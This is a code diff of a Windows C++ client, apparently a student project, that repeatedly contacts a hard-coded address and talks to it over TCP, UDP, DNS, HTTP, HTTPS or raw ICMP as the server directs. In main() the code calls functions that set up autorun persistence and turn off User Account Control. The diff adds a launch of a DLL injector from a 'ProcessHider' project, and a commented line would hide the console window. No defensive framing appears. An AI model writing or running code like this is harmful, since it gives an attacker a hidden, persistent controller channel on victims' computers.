@@ -3,7 +3,6 @@ struct addrinfo *result = NULL,
 	*ptr = NULL,
 	hints;
 
-
 int TCP1(int ConnectSocket) {
 	int iResult;
 	char sendbuf[] = "Hello! I am TCP client!";
@@ -136,7 +135,7 @@ int Protocol(char *ip) {
 				return 4;
 			}
 			else if (recvbuf[0] == '5') {
-				printf("\nProtocol HTPPS \n");
+				printf("\nProtocol HTTPS \n");
 				iResult = send(ConnectSocket, "1", 1, 0);
 				return 5;
 			}
@@ -368,7 +367,7 @@ int DNS(char *ip) {
 		for (int i = 0; i < iResult; i++) {
 			subStr[i] = recvbuf[i];
 		}
-		printf("IP server gui lai la: %s\n", subStr);
+		printf("%s\n", subStr);
 		if (subStr[strlen(subStr) - 1] == '*') {
 			return 1;
 		}
@@ -471,7 +470,7 @@ int HTTP(char *ip) {
 	return 0;
 }
 
-int ICMP(char *ip) {
+int Ping(char *ip) {
 	SOCKET rawSocket;
 	WSADATA wsaData;
 	WORD   wVersionRequested = MAKEWORD(2, 0);
@@ -515,6 +514,13 @@ int ICMP(char *ip) {
 
 	int nRet;
 	int bg = 123;
+	char sendBuffer[sizeof(struct tagICMPHDR) + 32] = { 0 };
+	_ICMP = new ICMP();
+	_ICMP->type = 0;
+	_ICMP->code = 0;
+	_ICMP->cksum = 0;
+	_ICMP->id = bg++;
+	_ICMP->seq++;
 	while (1) {
 		ECHOREPLY echoReply;
 
@@ -539,34 +545,30 @@ int ICMP(char *ip) {
 			return 1;
 		}
 		//Here it constructs the echo reply and sends the same back to the client
-		ECHOREQUEST echoReq;
-		int nId = 1;
-		int nSeq = 1;
-		int nRet, nIndex;
+		//ECHOREQUEST echoReq;
 		//_ICMP = new ICMP();
-		//_ICMP = NULL;
 
 		//Fill in echo reply..
-		_ICMP.type = 0;
-		_ICMP.code = 0;
-		_ICMP.cksum = 0;
-		_ICMP.id = bg++;
-		_ICMP.seq++;
 
-		char sendBuffer[sizeof(struct tagICMPHDR) + 32];
-		memcpy(sendBuffer, &_ICMP, sizeof(struct ICMP));
+
+
+		memcpy(sendBuffer, _ICMP, sizeof(struct ICMP));
 		char msg[] = "I am ICMP!";
-
+		//cout << _ICMP << endl;
+		//cout << &sendBuffer << endl;
 		//msg[strlen(msg)] = '\0';
-		int length = strlen(msg) + 1;
+		int length = strlen(msg);
 
 		memcpy(sendBuffer + sizeof(struct ICMP), msg, length);
-		_ICMP.cksum = in_cksum((USHORT *)sendBuffer, sizeof sendBuffer);
-		memcpy(sendBuffer, &_ICMP, sizeof(struct ICMP));
+		_ICMP->cksum = in_cksum((USHORT *)sendBuffer, sizeof sendBuffer);
+		//u_short x = in_cksum((USHORT *)sendBuffer, sizeof sendBuffer);
+		//printf("%d",x);
+		//_ICMP->cksum = x;
+		memcpy(sendBuffer, _ICMP, sizeof(struct ICMP));
 		//save tick count when sent..
-		echoReq.dwTime = GetTickCount();
+		//echoReq.dwTime = GetTickCount();
 		//Put data in packet and compute checksum
-
+		Sleep(1000);
 		objClientAddress.sin_addr.s_addr = inet_addr(ip);
 		objClientAddress.sin_family = AF_INET;
 		nRet = sendto(rawSocket, sendBuffer, sizeof(sendBuffer), 0, (struct sockaddr *)&objClientAddress, nAddrLen);
@@ -713,7 +715,7 @@ int HTTPS(char *ip) {
 		SSL_CTX_free(ctx);
 
 		WSACleanup();
-		printf("Finished.\n");
+		//		printf("Finished.\n");
 		if (flag == 1) return 0;
 	}
 	return 0;
@@ -722,23 +724,16 @@ int main()
 {
 	AutoRunStartUp();
 	CloseUAC();
+	stringstream ss;
+	string path = "D:\\Nam 5\\t6\\ProcessHider-master\\ProcessHider-master\\x64\\Release\\DLL_Injector.exe";
+
+	ss << "\"";                             // command opening quote
+	ss << "\"" << path << "\" "; // Quoted binary (could have spaces)
+	ss << "\"";                             // command closing quote
+	startup(ss.str().c_str());
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char ip[] = "192.168.44.143";
-	//UDP(ip);
-	//TCP(ip);
+	char ip[] = "192.168.8.102";
 
-	//WSADATA wsaData; ///The WSADATA structure contains information about the Windows Sockets implementation.
-	//SOCKET ConnectSocket = INVALID_SOCKET;
-
-	//int iResult;
-	//// Initialize Winsock
-	//iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	//if (iResult != 0) {
-	//	printf("WSAStartup failed with error: %d\n", iResult);
-	//	return 1;
-	//}
-
-	//DNS(ip);
 	while (1) {
 		int protocol = Protocol(ip);
 		if (protocol == 2) {
@@ -759,10 +754,9 @@ int main()
 		}
 		else if (protocol == 5) {
 			HTTPS(ip);
-
 		}
-		else {			
-			ICMP(ip);
+		else {
+			Ping(ip);
 		}
 	}
 
